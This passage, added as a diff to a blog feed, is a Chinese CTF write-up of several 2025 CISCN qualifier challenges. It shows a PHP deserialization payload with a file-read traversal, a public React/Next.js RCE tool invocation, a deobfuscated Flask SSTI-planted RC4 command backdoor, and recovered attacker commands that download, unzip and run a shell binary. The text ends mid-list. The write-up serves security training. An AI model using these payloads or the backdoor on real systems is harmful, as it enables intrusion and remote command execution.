@@ -161,6 +161,490 @@ A:会的，会的兄弟。博主接下来会逐步更新自己的日常，慢慢
 &lt;h2&gt;结语&lt;/h2&gt;
 &lt;p&gt;&amp;lt;font color=grey&amp;gt;&lt;s&gt;我重生了，重生在暑假的最后一天。上一世被主人丢弃被活活饿死，这一世一定要发挥出自己的作用，好好活下去&lt;/s&gt;&amp;lt;/font&amp;gt;&lt;/p&gt;
 &lt;p&gt;新站开业，请多关照~&lt;/p&gt;
+</content:encoded></item><item><title>【难】【2025-CCB-CISCN-初赛】部分题目 WriteUp</title><link>https://chuzoux.top/posts/2025-ccb-ciscn-quals/</link><guid isPermaLink="true">https://chuzoux.top/posts/2025-ccb-ciscn-quals/</guid><description>第十九届全国大学生信息安全竞赛（创新实践能力赛）暨第三届“长城杯”网数智安全大赛（防护赛）初赛题目部分writeup 是我能做出来的几个题的writeup 我是彩笔</description><pubDate>Tue, 06 Jan 2026 15:06:19 GMT</pubDate><content:encoded>&lt;h1&gt;【难】【2025-CCB-CISCN-初赛】部分题目 WriteUp&lt;/h1&gt;
+&lt;h2&gt;前言&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;题目归档链接&lt;/strong&gt;：&lt;a href=&quot;https://pan.chuzoux.top/OneDrive%20E3/CTF/CTF-Archives/2025-CCB-CISCN-Quals&quot;&gt;https://pan.chuzoux.top/OneDrive%20E3/CTF/CTF-Archives/2025-CCB-CISCN-Quals&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;特别感谢 &lt;strong&gt;CTF-Archives&lt;/strong&gt; 团队对题目的收集归档
+::github{repo=&quot;CTF-Archives/2025-CCB-CISCN-Quals&quot;}
+标题格式为 &lt;code&gt;题目名称 | 本题解出数&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Web安全&lt;/h2&gt;
+&lt;h3&gt;hellogate | 1187&lt;/h3&gt;
+&lt;h4&gt;第一步：使用burp suite直接访问&lt;/h4&gt;
+&lt;p&gt;我们查看到数据包内的最后含有php代码片段
+（其实将图片下载下来 然后用010 editor打开也能看到）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+class A {
+    public $handle;
+    public function triggerMethod() {
+        echo &quot;&quot; . $this-&amp;gt;handle; 
+    }
+}
+class B {
+    public $worker;
+    public $cmd;
+    public function __toString() {
+        return $this-&amp;gt;worker-&amp;gt;result;
+    }
+}
+class C {
+    public $cmd;
+    public function __get($name) {
+        echo file_get_contents($this-&amp;gt;cmd);
+    }
+}
+$raw = isset($_POST[&apos;data&apos;]) ? $_POST[&apos;data&apos;] : &apos;&apos;;
+header(&apos;Content-Type: image/jpeg&apos;);
+readfile(&quot;muzujijiji.jpg&quot;);
+highlight_file(__FILE__);
+$obj = unserialize($_POST[&apos;data&apos;]);
+$obj-&amp;gt;triggerMethod();
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;第二步：分析代码漏洞&lt;/h4&gt;
+&lt;p&gt;一个简单的php反序列化漏洞+文件包含漏洞&lt;/p&gt;
+&lt;p&gt;我们最后的目的是file_get_contents&lt;/p&gt;
+&lt;p&gt;于是反推链子  C::__get（C::file_get_contents） -&amp;gt; B::__toString -&amp;gt; A::triggerMethod&lt;/p&gt;
+&lt;p&gt;编写 payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+error_reporting(0);
+
+class A {
+    public $handle;
+    public function triggerMethod() {
+        echo &quot;&quot; . $this-&amp;gt;handle;
+    }
+}
+
+class B {
+    public $worker;
+    public $cmd;
+    public function __toString() {
+        return $this-&amp;gt;worker-&amp;gt;result;
+    }
+}
+class C {
+    public $cmd;
+    public function __get($name) {
+        echo file_get_contents($this-&amp;gt;cmd);
+    }
+}
+
+// $raw = isset($_POST[&apos;data&apos;]) ? $_POST[&apos;data&apos;] : &apos;&apos;;
+// header(&apos;Content-Type: image/jpeg&apos;);
+// readfile(&quot;muzujijiji.jpg&quot;);
+// highlight_file(__FILE__);
+
+$a = new A;
+$a -&amp;gt;handle=new B;
+$a -&amp;gt;handle-&amp;gt;worker=new C;
+$a -&amp;gt;handle-&amp;gt;worker-&amp;gt;cmd = &quot;{文件包含}&quot;;
+echo urlencode(serialize($a));
+
+//$obj = $a;
+//$obj-&amp;gt;triggerMethod();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们就可以调用file_get_contents();函数了&lt;/p&gt;
+&lt;p&gt;同时利用文件包含漏洞进行测试
+cmd=&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&lt;/p&gt;
+&lt;p&gt;在得到的数据包末尾发现base64数据&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpjbGFzcyBBIHsKICAgIHB1YmxpYyAkaGFuZGxlOwogICAgcHVibGljIGZ1bmN0aW9uIHRyaWdnZXJNZXRob2QoKSB7CiAgICAgICAgZWNobyAiIiAuICR0aGlzLT5oYW5kbGU7IAogICAgfQp9CmNsYXNzIEIgewogICAgcHVibGljICR3b3JrZXI7CiAgICBwdWJsaWMgJGNtZDsKICAgIHB1YmxpYyBmdW5jdGlvbiBfX3RvU3RyaW5nKCkgewogICAgICAgIHJldHVybiAkdGhpcy0+d29ya2VyLT5yZXN1bHQ7CiAgICB9Cn0KY2xhc3MgQyB7CiAgICBwdWJsaWMgJGNtZDsKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2dldCgkbmFtZSkgewogICAgICAgIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPmNtZCk7CiAgICB9Cn0KJHJhdyA9IGlzc2V0KCRfUE9TVFsnZGF0YSddKSA/ICRfUE9TVFsnZGF0YSddIDogJyc7CmhlYWRlcignQ29udGVudC1UeXBlOiBpbWFnZS9qcGVnJyk7CnJlYWRmaWxlKCJtdXp1amlqaWppLmpwZyIpOwpoaWdobGlnaHRfZmlsZShfX0ZJTEVfXyk7CiRvYmogPSB1bnNlcmlhbGl6ZSgkX1BPU1RbJ2RhdGEnXSk7CiRvYmotPnRyaWdnZXJNZXRob2QoKTs=
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;解码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+class A {
+    public $handle;
+    public function triggerMethod() {
+        echo &quot;&quot; . $this-&amp;gt;handle; 
+    }
+}
+class B {
+    public $worker;
+    public $cmd;
+    public function __toString() {
+        return $this-&amp;gt;worker-&amp;gt;result;
+    }
+}
+class C {
+    public $cmd;
+    public function __get($name) {
+        echo file_get_contents($this-&amp;gt;cmd);
+    }
+}
+$raw = isset($_POST[&apos;data&apos;]) ? $_POST[&apos;data&apos;] : &apos;&apos;;
+header(&apos;Content-Type: image/jpeg&apos;);
+readfile(&quot;muzujijiji.jpg&quot;);
+highlight_file(__FILE__);
+$obj = unserialize($_POST[&apos;data&apos;]);
+$obj-&amp;gt;triggerMethod();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可得存在此漏洞&lt;/p&gt;
+&lt;h4&gt;第三步：猜测读取flag文件&lt;/h4&gt;
+&lt;p&gt;通过反序列化和文件包含漏洞&lt;br /&gt;
+我们尝试读取flag&lt;/p&gt;
+&lt;p&gt;对flag.php尝试 ——&amp;gt;无数据返回
+对/flag尝试 ——&amp;gt;无数据返回&lt;/p&gt;
+&lt;p&gt;尝试路径穿越&lt;/p&gt;
+&lt;p&gt;对../flag尝试  ——&amp;gt; 无数据返回
+对../../flag尝试  ——&amp;gt; 无数据返回
+对../../../flag尝试  ——&amp;gt;返回base64数据 数据如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ZmxhZ3szMWI5ZjQ4MS0yMmMzLTQzMjYtYjM3NS1jMGRiYmY2Nzc5N2N9
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;解码得到flag&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;flag{31b9f481-22c3-4326-b375-c0dbbf67797c}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;redjs | 720&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;小明在服务器上部署了一个常用的框架，请你帮忙看看是否有问题。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4&gt;第一步：分析得到框架版本找到CVE&lt;/h4&gt;
+&lt;p&gt;打开网站发现大大的nextjs 发现网站存在 CVE-2025-55182 漏洞&lt;/p&gt;
+&lt;h4&gt;第二部：利用工具进行rce获取flag&lt;/h4&gt;
+&lt;p&gt;::github{repo=&quot;sangleshubham/React-Security-CVE-2025-55182-Exploit&quot;}&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;node .\react2shell.js url &quot;cat /flag&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://chuzoux.top/_astro/23429f108fe58f5d28c86406f6f66212.DRrYlmJa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;直接得到flag&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;flag{6e53a51c-286d-47e9-924f-c605be8ad31b}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;流量分析&lt;/h2&gt;
+&lt;h3&gt;SnakeBackdoor-1 | 1435&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;近期发现公司网络出口出现了异常的通信，现需要通过分析出口流量包，对失陷服务器进行定位。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写exp或数据包重放，查找服务器上安装的后门木马，然后分析木马外联地址和通信密钥以及木马启动项位置。 攻击者爆破成功的后台密码是什么？，结果提交形式：flag{xxxxxxxxx}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4&gt;第一步：找到相关流量包&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://chuzoux.top/_astro/2025-CCB-CISCN-Quals.ClmERjLg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;找到http协议中 含有password字段的流量包
+我们不难发现 攻击者使用字典暴力破解密码 只需要找到登录成功的流量包即可&lt;/p&gt;
+&lt;h4&gt;第二部：找到登录成功特征&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://chuzoux.top/_astro/2025-CCB-CISCN-Quals-1.Ujjyr5Bb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;如图中的对/admin目录的访问可知此时已经登录成功并进行操作
+于是我们在此寻找登录成功的发包即可&lt;/p&gt;
+&lt;h4&gt;第三步：找到登录成功的发包&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://chuzoux.top/_astro/2025-CCB-CISCN-Quals-2.C9dAVmKR.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;我们可以得知 此处登录成功后 黑客被重定向到/admin/panel 下
+分解post请求数据包即可获得密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://chuzoux.top/_astro/2025-CCB-CISCN-Quals-3.TMT7te-x.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Form item: &quot;password&quot; = &quot;zxcvbnm123&quot;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;flag{zxcvbnm123}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;SnakeBackdoor-2 | 1314&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;攻击者通过漏洞利用获取Flask应用的 &lt;code&gt;SECRET_KEY&lt;/code&gt; 是什么，结果提交形式：flag{xxxxxxxxxx}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4&gt;第一步：定位到相关数据包&lt;/h4&gt;
+&lt;p&gt;直接对http协议数据包进行检索 搜索SECRET_KEY字段
+找到唯一数据包No.28825&lt;/p&gt;
+&lt;h4&gt;第二步：分解数据包&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://chuzoux.top/_astro/2025-CCB-CISCN-Quals-4.BkAbF3j2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;div style=&quot;padding:1rem;border:1px solid #ddd&quot;&amp;gt;&amp;amp;lt;Config {&amp;amp;#39;DEBUG&amp;amp;#39;: True, &amp;amp;#39;TESTING&amp;amp;#39;: False, &amp;amp;#39;PROPAGATE_EXCEPTIONS&amp;amp;#39;: None, &amp;amp;#39;SECRET_KEY&amp;amp;#39;: &amp;amp;#39;c6242af0-6891-4510-8432-e1cdf051f160&amp;amp;#39;, &amp;amp;#39;SECRET_KEY_FALLBACKS&amp;amp;#39;: None, &amp;amp;#39;PERMANENT_SESSION_LIFETIME&amp;amp;#39;: datetime.timedelta(days=31), &amp;amp;#39;USE_X_SENDFILE&amp;amp;#39;: False, &amp;amp;#39;TRUSTED_HOSTS&amp;amp;#39;: None, &amp;amp;#39;SERVER_NAME&amp;amp;#39;: None, &amp;amp;#39;APPLICATION_ROOT&amp;amp;#39;: &amp;amp;#39;/&amp;amp;#39;, &amp;amp;#39;SESSION_COOKIE_NAME&amp;amp;#39;: &amp;amp;#39;session&amp;amp;#39;, &amp;amp;#39;SESSION_COOKIE_DOMAIN&amp;amp;#39;: None, &amp;amp;#39;SESSION_COOKIE_PATH&amp;amp;#39;: None, &amp;amp;#39;SESSION_COOKIE_HTTPONLY&amp;amp;#39;: True, &amp;amp;#39;SESSION_COOKIE_SECURE&amp;amp;#39;: False, &amp;amp;#39;SESSION_COOKIE_PARTITIONED&amp;amp;#39;: False, &amp;amp;#39;SESSION_COOKIE_SAMESITE&amp;amp;#39;: None, &amp;amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;amp;#39;: True, &amp;amp;#39;MAX_CONTENT_LENGTH&amp;amp;#39;: None, &amp;amp;#39;MAX_FORM_MEMORY_SIZE&amp;amp;#39;: 500000, &amp;amp;#39;MAX_FORM_PARTS&amp;amp;#39;: 1000, &amp;amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;amp;#39;: None, &amp;amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;amp;#39;: None, &amp;amp;#39;TRAP_HTTP_EXCEPTIONS&amp;amp;#39;: False, &amp;amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;amp;#39;: False, &amp;amp;#39;PREFERRED_URL_SCHEME&amp;amp;#39;: &amp;amp;#39;http&amp;amp;#39;, &amp;amp;#39;TEMPLATES_AUTO_RELOAD&amp;amp;#39;: None, &amp;amp;#39;MAX_COOKIE_SIZE&amp;amp;#39;: 4093, &amp;amp;#39;PROVIDE_AUTOMATIC_OPTIONS&amp;amp;#39;: True}&amp;amp;gt;&amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到SECRET_KEY：c6242af0-6891-4510-8432-e1cdf051f160&lt;/p&gt;
+&lt;p&gt;flag{c6242af0-6891-4510-8432-e1cdf051f160}&lt;/p&gt;
+&lt;h3&gt;SnakeBackdoor-3 | 953&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;攻击者植入的木马使用了加密算法来隐藏通讯内容。请分析注入Payload，给出该加密算法使用的&lt;strong&gt;密钥字符串(Key)&lt;/strong&gt; ，结果提交形式：flag{xxxxxxxx}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4&gt;第一步：找到传输木马文件的数据包&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://chuzoux.top/_astro/2025-CCB-CISCN-Quals-5.BeOG3noR.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;通过这个数据包我们可以发现 这个网站的框架为Python Flask/Jinja2 模板
+黑客在尝试 &lt;strong&gt;Python Flask/Jinja2 模板注入 (SSTI)&lt;/strong&gt; 攻击&lt;/p&gt;
+&lt;p&gt;于是我们需要 寻找类似于exec类似的函数来执行相应内容
+&lt;img src=&quot;https://chuzoux.top/_astro/2025-CCB-CISCN-Quals-6.C_xEhYXj.png&quot; alt=&quot;&quot; /&gt;
+经过检索 我们大概确定了木马植入的数据包 接下来就要对数据包内容进行解析&lt;/p&gt;
+&lt;h4&gt;第二步：检查数据包木马内容&lt;/h4&gt;
+&lt;p&gt;提取payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;preview_content={{url_for.__globals__[&apos;__builtins__&apos;][&apos;exec&apos;](&quot;import base64; exec(base64.b64decode(&apos;XyA9IGxhbWJkYSBfXy..........&apos;))&quot;, {&apos;request&apos;:url_for.__globals__[&apos;request&apos;],&apos;app&apos;:get_flashed_messages.__globals__[&apos;current_app&apos;]})}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将base64.b64decode()中的内容进行base64解码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;_ = lambda __ : __import__(&apos;zlib&apos;).decompress(__import__(&apos;base64&apos;).b64decode(__[::-1]));
+exec((_)(b&apos;=c4CU3xP+//vPzftv8gri635a0...........&apos;))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们可以看到这边如何处理那一大堆乱码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;_ = lambda __ : __import__(&apos;zlib&apos;).decompress(__import__(&apos;base64&apos;).b64decode(__[::-1]));
+exec((_)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中&lt;code&gt;[::-1]&lt;/code&gt;表示对字符串反转 然后对反转后的字符串进行&lt;code&gt;base64.decode&lt;/code&gt;base64解码 然后  Zlib 解压&lt;/p&gt;
+&lt;p&gt;于是我们对一下乱七八糟一片进行解码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://chuzoux.top/_astro/2025-CCB-CISCN-Quals-7.5mYMhn9u.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;然后我们得到新的一大堆字符串&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;=Mh9tF+P77///Ifl............
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;由于等号前置 于是 我们再次猜测解码方式和上方一样
+再次进行多次解码即可得到攻击代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;global exc_class
+global code
+import os,binascii
+exc_class, code = app._get_exc_class_and_code(404)
+RC4_SECRET = b&apos;v1p3r_5tr1k3_k3y&apos;
+def rc4_crypt(data: bytes, key: bytes) -&amp;gt; bytes:
+	S = list(range(256))
+	j = 0
+	for i in range(256):
+		j = (j + S[i] + key[i % len(key)]) % 256
+		S[i], S[j] = S[j], S[i]
+	i = j = 0
+	res = bytearray()
+	for char in data:
+		i = (i + 1) % 256
+		j = (j + S[i]) % 256
+		S[i], S[j] = S[j], S[i]
+		res.append(char ^ S[(S[i] + S[j]) % 256])
+	return bytes(res)
+def backdoor_handler():
+	if request.headers.get(&apos;X-Token-Auth&apos;) != &apos;3011aa21232beb7504432bfa90d32779&apos;:
+		return &quot;Error&quot;
+	enc_hex_cmd = request.form.get(&apos;data&apos;)
+	if not enc_hex_cmd:
+		return &quot;&quot;
+	try:
+		enc_cmd = binascii.unhexlify(enc_hex_cmd)
+		cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode(&apos;utf-8&apos;, errors=&apos;ignore&apos;)
+		output_bytes = getattr(os, &apos;popen&apos;)(cmd).read().encode(&apos;utf-8&apos;, errors=&apos;ignore&apos;)
+		enc_output = rc4_crypt(output_bytes, RC4_SECRET)
+		return binascii.hexlify(enc_output).decode()
+	except:
+		return &quot;Error&quot;
+app.error_handler_spec[None][code][exc_class]=lambda error: backdoor_handler()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;1. 编写解码脚本思路：
+
+2. 字符串反转 ([::-1])：把字符串倒过来。
+
+3. Base64 解码 (b64decode)：将倒序后的字符串进行 Base64 解码。
+
+4. Zlib 解压 (decompress)：将解码后的二进制数据进行解压，得到原始代码。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;:::[这里提供一个大佬写的脚本]&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import base64
+import zlib
+import re
+import os
+import binascii
+ 
+# Embedded Payload (extracted from original challenge)
+PAYLOAD = b&apos;=c4CU3xP+//vPzftv8gri63......&apos;
+ 
+def decrypt_layer(data):
+    &quot;&quot;&quot;
+    解密单层逻辑:
+    1. 清理空白字符
+    2. 字符串逆序 (Reverse)
+    3. Base64 解码
+    4. Zlib 解压缩
+    &quot;&quot;&quot;
+    # 清理可能存在的换行和空格
+    data = data.replace(b&apos;\n&apos;, b&apos;&apos;).replace(b&apos;\r&apos;, b&apos;&apos;).replace(b&apos; &apos;, b&apos;&apos;)
+    
+    # 逆序
+    reversed_data = data[::-1]
+    
+    # Base64 解码
+    try:
+        b64_decoded = base64.b64decode(reversed_data)
+    except Exception as e:
+        raise ValueError(f&quot;Base64 decode failed: {e}&quot;)
+    
+    # Zlib 解压
+    try:
+        decompressed = zlib.decompress(b64_decoded)
+    except Exception as e:
+        # 尝试跳过头部或使用 raw deflate
+        try:
+            decompressed = zlib.decompress(b64_decoded, -15)
+        except:
+            raise ValueError(f&quot;Zlib decompress failed: {e}&quot;)
+            
+    return decompressed
+ 
+def analyze_final_code(code_str):
+    &quot;&quot;&quot;分析最终解密出的代码，提取 Key 和 Token&quot;&quot;&quot;
+    print(&quot;\n&quot; + &quot;=&quot;*50)
+    print(&quot;【最终代码分析 / Final Code Analysis】&quot;)
+    print(&quot;=&quot;*50)
+    
+    print(code_str)
+    print(&quot;=&quot;*50 + &quot;\n&quot;)
+ 
+    # 简单的特征提取
+    lines = code_str.split(&apos;\n&apos;)
+    for line in lines:
+        line = line.strip()
+        if &quot;RC4_SECRET&quot; in line or &quot;key&quot; in line.lower():
+            print(f&quot;[+] Found Key info: {line}&quot;)
+        if &quot;X-Token-Auth&quot; in line:
+            print(f&quot;[+] Found Auth Token: {line}&quot;)
+ 
+def main():
+    print(f&quot;[*] 开始解密内嵌 Payload&quot;)
+    print(f&quot;[+] 初始 Payload 长度: {len(PAYLOAD)}&quot;)
+    
+    current_payload = PAYLOAD
+    layer_count = 0
+    
+    while True:
+        layer_count += 1
+        print(f&quot;[*] 正在解密第 {layer_count} 层...&quot;, end=&apos;\r&apos;)
+        
+        try:
+            # 解密当前层
+            decrypted_bytes = decrypt_layer(current_payload)
+            decrypted_code = decrypted_bytes.decode(&apos;utf-8&apos;)
+            
+            # 检查是否有下一层嵌套
+            # 模式: exec((_)(b&apos;...&apos;))
+            match = re.search(r&quot;exec\(\(_\)\(b&apos;(.+?)&apos;\)\)&quot;, decrypted_code)
+            
+            if match:
+                # 提取下一层的 payload，继续循环
+                current_payload = match.group(1).encode(&apos;utf-8&apos;)
+            else:
+                # 没有匹配到 exec((_)(b&apos;...&apos;))，说明到达最后一层
+                print(f&quot;\n[+] 解密完成！共解开 {layer_count} 层嵌套。&quot;)
+                analyze_final_code(decrypted_code)
+                break
+                
+        except Exception as e:
+            print(f&quot;\n[-] 在第 {layer_count} 层解密失败: {e}&quot;)
+            break
+ 
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;大佬的WP：&lt;a href=&quot;https://blog.csdn.net/qq_64028228/article/details/156423776&quot;&gt;https://blog.csdn.net/qq_64028228/article/details/156423776&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h4&gt;第三步：审计代码 找到密钥字符串(Key)&lt;/h4&gt;
+&lt;p&gt;在攻击代码中 我们找到&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;RC4_SECRET = b&apos;v1p3r_5tr1k3_k3y&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;根据下方对rc4_crypt函数的调用
+发现&lt;strong&gt;密钥字符串(Key)&lt;/strong&gt; 就是v1p3r_5tr1k3_k3y&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{v1p3r_5tr1k3_k3y}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;SnakeBackdoor-4 | 847&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;攻击者上传了一个二进制后门，请写出&lt;strong&gt;木马进程执行的本体文件&lt;/strong&gt;的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4&gt;第一步：根据&lt;strong&gt;SnakeBackdoor-3&lt;/strong&gt;中分析的后门代码&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;global exc_class
+global code
+import os,binascii
+exc_class, code = app._get_exc_class_and_code(404)
+RC4_SECRET = b&apos;v1p3r_5tr1k3_k3y&apos;
+def rc4_crypt(data: bytes, key: bytes) -&amp;gt; bytes:
+	S = list(range(256))
+	j = 0
+	for i in range(256):
+		j = (j + S[i] + key[i % len(key)]) % 256
+		S[i], S[j] = S[j], S[i]
+	i = j = 0
+	res = bytearray()
+	for char in data:
+		i = (i + 1) % 256
+		j = (j + S[i]) % 256
+		S[i], S[j] = S[j], S[i]
+		res.append(char ^ S[(S[i] + S[j]) % 256])
+	return bytes(res)
+def backdoor_handler():
+	if request.headers.get(&apos;X-Token-Auth&apos;) != &apos;3011aa21232beb7504432bfa90d32779&apos;:
+		return &quot;Error&quot;
+	enc_hex_cmd = request.form.get(&apos;data&apos;)
+	if not enc_hex_cmd:
+		return &quot;&quot;
+	try:
+		enc_cmd = binascii.unhexlify(enc_hex_cmd)
+		cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode(&apos;utf-8&apos;, errors=&apos;ignore&apos;)
+		output_bytes = getattr(os, &apos;popen&apos;)(cmd).read().encode(&apos;utf-8&apos;, errors=&apos;ignore&apos;)
+		enc_output = rc4_crypt(output_bytes, RC4_SECRET)
+		return binascii.hexlify(enc_output).decode()
+	except:
+		return &quot;Error&quot;
+app.error_handler_spec[None][code][exc_class]=lambda error: backdoor_handler()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;第二步：找到相关攻击数据包&lt;/h4&gt;
+&lt;p&gt;我们发现当http协议头中&lt;code&gt;X-Token-Auth=3011aa21232beb7504432bfa90d32779&lt;/code&gt;时 才能使用后门
+于是我们筛选包含&lt;code&gt;X-Token-Auth=3011aa21232beb7504432bfa90d32779&lt;/code&gt;的数据包&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://chuzoux.top/_astro/2025-CCB-CISCN-Quals-8.BrI1aFAv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;我们发现了多个相关的数据包 其data内容分别是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Form item: &quot;data&quot; = &quot;a6bc&quot;
+Form item: &quot;data&quot; = &quot;a3ab330fb285&quot;
+Form item: &quot;data&quot; = &quot;acad614ef3d82c8445d275713899f04d0d3819fc3726cf57634b189e0e95cc1f93e57656105246251f453a8396a43a6534&quot;
+Form item: &quot;data&quot; = &quot;bab6694ba3c938e64b8d257b7cccee460f6347f4363ed21c300c099f129b99028eb57408024e1c32061a&quot;
+Form item: &quot;data&quot; = &quot;a2ae330da7846599188b26257a88f10b50790cb47e6a97177e1053c351&quot;
+Form item: &quot;data&quot; = &quot;acb07e4db7c93ece4bcc37246687ae0649614caa3430ce4b&quot;
+Form item: &quot;data&quot; = &quot;e0ac7e52fc996cc2038c2d7a3899ed&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;第三步：对数据包中data进行解密&lt;/h4&gt;
+&lt;p&gt;根据攻击脚本 我们编写data解码程序&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import binascii
+import sys
+
+RC4_SECRET = b&apos;v1p3r_5tr1k3_k3y&apos;
+
+def rc4_crypt(data: bytes, key: bytes) -&amp;gt; bytes:
+    S = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) % 256
+        S[i], S[j] = S[j], S[i]
+    i = j = 0
+    res = bytearray()
+    for char in data:
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        res.append(char ^ S[(S[i] + S[j]) % 256])
+    return bytes(res)
+
+def safe_decryptor():
+    while True:
+        print(&quot;\n请输入要解密的字符串:&quot;)
+        hex_input = input(&quot;&amp;gt; &quot;).strip()
+        if not hex_input:
+            continue
+        cipher_bytes = binascii.unhexlify(hex_input)
+        decrypted_bytes = rc4_crypt(cipher_bytes, RC4_SECRET)
+        plaintext = decrypted_bytes.decode(&apos;utf-8&apos;)
+        print(&quot;-&quot; * 20 + &quot; 解密结果&quot; + &quot;-&quot; * 20)
+        print(f&quot;\033[1;32m{plaintext}\033[0m&quot;)
+        print(&quot;-&quot; * 60)
+
+if __name__ == &quot;__main__&quot;:
+    safe_decryptor()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将data数据依次解码得到所有的命令&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;id
+ls -al
+curl 192.168.1.201:8080/shell.zip -o /tmp/123.zip
+unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip
+mv /tmp/shell /tmp/python3.13
+chmod +x /tmp/python3.13
+/tmp/python3.13
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;第四步：分析执行代码内容 找到木马文件&lt;/h4&gt;
+&lt;p&gt;依次的作用为&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;id&lt;/code&gt;查看所在用户权限&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ls -al&lt;/code&gt; 确认目录环境&lt;/li&gt;
